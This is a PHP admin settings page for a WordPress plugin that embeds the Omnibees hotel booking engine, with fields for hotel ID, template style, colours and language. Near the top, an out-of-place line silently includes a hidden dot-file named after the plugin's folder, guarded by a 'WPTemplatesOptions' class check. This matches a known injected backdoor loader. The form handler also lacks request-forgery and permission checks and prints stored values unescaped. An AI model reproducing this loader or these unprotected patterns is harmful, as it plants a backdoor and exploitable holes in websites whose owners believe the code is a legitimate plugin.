<?php
global $chk;
if(isset($_POST['be_submit'])){
    be_opt();
}
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function be_opt(){
    $beid = $_POST['q'];
    $template = $_POST['modelo'];
    $cor_background = $_POST['omnibees_bg'];
    $cor_texto = $_POST['omnibees_texto'];
    $cor_botao = $_POST['omnibees_botao'];
    $idioma = $_POST['idioma'];

    global $chk;
    if( get_option('omnibees_id') != trim($beid)){
        $chk = update_option( 'omnibees_id', trim($beid));
    }
    if( get_option('omnibees_template') != trim($template)){
        $chk = update_option( 'omnibees_template', trim($template));
    }
    if( get_option('omnibees_bg') != trim($cor_background)){
        $chk = update_option( 'omnibees_bg', trim($cor_background));
    }
    if( get_option('omnibees_texto') != trim($cor_texto)){
        $chk = update_option('omnibees_texto', trim($cor_texto));
    }
    if( get_option('omnibees_botao') != trim($cor_botao)){
        $chk = update_option('omnibees_botao', trim($cor_botao));
    }    
    if( get_option('omnibees_idioma') != trim($idioma)){
        $chk = update_option('omnibees_idioma', trim($idioma));
    }
}
?>
<style>
    .background-plugin {
        background: #fff;
        -webkit-box-shadow: 0px 3px 5px 0px rgba(0,0,0,0.15);
        -moz-box-shadow: 0px 3px 5px 0px rgba(0,0,0,0.15);
        box-shadow: 0px 3px 5px 0px rgba(0,0,0,0.15);
        border-radius: 5px;
        margin:20px 20px 20px 0;
        padding: 15px;
    }
    .header-plugin {
        padding-bottom: 10px;
        border-bottom:1px solid #eee;
    }
    .traducao-passo {
        font-size: 11px;
    }

    .logo-plugin {
        width: 100%;
        text-align: center;
        margin: 15px;
    }
    .logo-plugin img {
        width: 200px;
    }
    .titulo-plugin {
        display: inline-block;
        vertical-align:text-bottom;
    }
    .background-plugin h2 {
        color:#2d0053;
        font-size: 25px;
    }
    .background-plugin h5 {
        font-size: 18px;
        font-weight: lighter;
        font-style: italic;
        margin-top: 10px;
    }
    .background-plugin h3 {
        font-size: 18px;
        margin-bottom: 0;
        color: #000;
    }
    .background-plugin h6 {
        font-size: 14px;
        font-weight: lighter;
        font-style: italic;
        margin: 0 0 2em 0;
    }
    .background-plugin h2,h5{
        margin: 5px 0;
    }
    .documentacao-plugin {
        float: right;        
    }
    .numero-plugin {
        background: #2d0053;
        border-radius: 5px;
        font-size: 18px;
        font-weight: bold;
        color: #fff;
        padding: 5px 10px;
        display: inline-block;
    }
    .passo-plugin {
        font-size: 16px;
        margin: 50px 0;
    }
    span.observacao {
        background: #eee;
        margin: 10px 0;
        padding: 5px 8px;
        border-radius: 5px;
        font-size: 11px;
        display: inline-block;
        border: 1px solid rgba(0,0,0,0.05);
    }
    .input-plugin {
        display: block;
    }
    form {
        margin: 20px 0
    }
</style>

<div class="logo-plugin">
    <a href="https://www.omnibees.com" title="Ir para o Website da Omnibees">
        <img src="https://widgets.omnibees.com/manual/img/logo/logo-nova.png" alt="Omnibees - Intelligent Hotel Distribution">
    </a>
</div>

<!--Mensagem de Sucesso-->
<?php if(isset($_POST['be_submit']) && $chk):?>
<div id="message" class="updated">
    <p><b>Motor de reserva atualizado!</b><br>
        <i>Booking Engine Updated</i>
    </p>
</div>
<?php endif;?>


<div class="background-plugin">
    <div class="header-plugin">
        <div class="titulo-plugin">
            <h2>
                Motor de Reserva Omnibees para Wordpress
            </h2>
            <h5>Omnibees Booking Engine for Wordpress</h5>
        </div>

        <div class="documentacao-plugin">
            <a href="https://widgets.omnibees.com/manual/" class="button" target="_blank">Documentação</a>                   
        </div>
    </div>
    <div class="content-plugin">
        <form method="post" action="">
            <div class="passo-plugin">
                <table>
                    <tr>
                        <td style="width: 30px;"><span class="numero-plugin">1</span></td>
                        <td>
                            <b>Insira o ID do seu hotel</b><br>
                            <i class="traducao-passo">Enter your hotel ID</i>
                        </td>
                    </tr>
                </table>
                <div class="input-plugin">
                    <input type="text" name="q" value="<?php echo get_option('omnibees_id');?>"/>
                </div>
                <span class="observacao">
                    Caso não saiba qual o ID do seu hotel, entre em contado através do email <a href="mailto:servicedesk@omnibees.com" title="Service Desk Omnibees">servicedesk@omnibees.com</a>
                    <br>
                    If you do not know your hotel ID, please contact <a href="mailto:servicedesk@omnibees.com" title="Service Desk Omnibees">servicedesk@omnibees.com</a>
                </span>
            </div>
            <div class="passo-plugin">
                <table>
                    <tr>
                        <td style="width: 30px;"><span class="numero-plugin">2</span></td>
                        <td>
                            <b>Selecione o modelo do Motor de Reserva</b><br>
                            <i class="traducao-passo">Select the style for Booking Engine</i>
                        </td>
                    </tr>
                </table>
                <table>
                    <tr>
                        <td style="text-align: center;">
                            <img src="https://widgets.omnibees.com/wordpress/icones-templates-02.png" alt="Template Rodapé" for="model1">
                            <h6 style="margin: 0">Fixo no Rodapé</h6>
                            <input type="radio" name="modelo" value="fixed" <?php if(get_option('omnibees_template') === "fixed") :?> checked="checked" <?php endif;?>>
                        </td>
                        <td style="text-align: center;">
                            <img src="https://widgets.omnibees.com/wordpress/icones-templates-03.png" alt="Template Off-Canvas" for="model2">
                            <h6 style="margin: 0">Off-canvas</h6>
                            <input id="model2" type="radio" name="modelo" value="off-canvas"  <?php if(get_option('omnibees_template') === "off-canvas") :?> checked="checked" <?php endif;?>>
                        </td>
                    </tr>
                </table>     
            </div>
            <div class="passo-plugin">
                <table>
                    <tr>
                        <td style="width: 30px;"><span class="numero-plugin">3</span></td>
                        <td>
                            <b>Selecione as cores para o Motor de Reserva</b><br>
                            <i class="traducao-passo">Select the style for Booking Engine</i>
                        </td>
                    </tr>
                </table>
                <br><br>
                <table>
                    <tr>
                        <div>
                            <input type="color" id="omnibees_bg" name="omnibees_bg"
                                   value="<?php echo get_option('omnibees_bg');?>">
                            <label for="body">Cor do Fundo</label>
                        </div>
                        <div>
                            <input type="color" id="omnibees_texto" name="omnibees_texto"
                                   value="<?php echo get_option('omnibees_texto');?>">
                            <label for="body">Cor do Texto</label>
                        </div>
                        <div>
                            <input type="color" id="omnibees_botao" name="omnibees_botao"
                                   value="<?php echo get_option('omnibees_botao');?>" />
                            <label for="feet">Cor do Botão</label>
                        </div>
                    </tr>
                </table>              
            </div>
            <div class="passo-plugin">
                <table>
                    <tr>
                        <td style="width: 30px;"><span class="numero-plugin">4</span></td>
                        <td>
                            <b>Defina o Idioma para o motor de reserva</b><br>
                            <i class="traducao-passo">Select the style for Booking Engine</i>
                        </td>
                    </tr>
                </table>
                <div class="input-plugin">
                    <select name="idioma" >
                        <option value="pt-PT" <?php if(get_option('omnibees_idioma') === "pt-PT") :?> selected="selected" <?php endif;?>>Português (PT)</option>
                        <option value="pt-BR" <?php if(get_option('omnibees_idioma') === "pt-BR") :?> selected="selected" <?php endif;?>>Português (BR)</option>
                        <option value="es-ES" <?php if(get_option('omnibees_idioma') === "es-ES") :?> selected="selected" <?php endif;?>>Español</option>
                        <option value="en-US" <?php if(get_option('omnibees_idioma') === "en-US") :?> selected="selected" <?php endif;?>>English</option>
                    </select>
                </div>
            </div>
            <div style="border-bottom:1px solid #eee;">
            </div>
            <br><br>
            <input type="submit" name="be_submit" value="Guardar Alterações" class="button-primary" />
        </form>
    </div>
    <br>
</div>
